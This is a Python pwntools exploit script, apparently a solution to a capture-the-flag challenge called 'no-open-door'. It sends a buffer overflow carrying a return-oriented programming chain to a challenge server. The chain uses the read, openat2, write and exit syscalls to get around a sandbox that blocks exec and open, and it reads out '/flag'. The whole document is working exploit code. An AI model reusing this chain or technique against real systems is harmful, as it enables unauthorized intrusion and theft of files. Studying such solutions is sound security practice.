from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

HOST, PORT = 'no-open-door.wolvctf-2026.kctf.cloud', 1337

POP_RDI, POP_RSI, POP_RDX = 0x40212f, 0x40a13e, 0x401766
POP_R10, POP_RAX, SYSCALL = 0x401765, 0x448167, 0x414b36
XCHG, RET = 0x40176b, 0x40101a
PATH, HOW, BUF = 0x4c9000, 0x4c9020, 0x4c9400

GADGETS = {'rdi': POP_RDI, 'rsi': POP_RSI, 'rdx': POP_RDX, 'r10': POP_R10, 'rax': POP_RAX}

def pop(reg, val):
    return p64(GADGETS[reg]) + p64(val)

def syscall(nr, regs):
    return b''.join(pop(r, v) for r, v in regs.items()) + p64(POP_RAX) + p64(nr) + p64(SYSCALL)

chain  = syscall(0,   {'rdi': 0, 'rsi': PATH, 'rdx': 0x100})
chain += syscall(437, {'rdi': (1 << 64) - 100, 'rsi': PATH, 'rdx': HOW, 'r10': 24})
chain += p64(XCHG)
chain += syscall(0,   {'rsi': BUF, 'rdx': 0x80})
chain += syscall(1,   {'rdi': 1, 'rsi': BUF, 'rdx': 0x80})
chain += syscall(231, {'rdi': 0})

stage1 = (b'A' * 0x40 + b'B' * 8 + p64(RET) + chain).ljust(0x200, b'\x00')
stage2 = b'/flag\x00'.ljust(0x20, b'\x00') + p64(0) * 3

io = remote(HOST, PORT)
io.recvuntil(b'sandbox rental unit. no exec, no open.')
io.send(stage1)
sleep(0.3)
io.send(stage2)
print(io.recvall(timeout=5).decode())
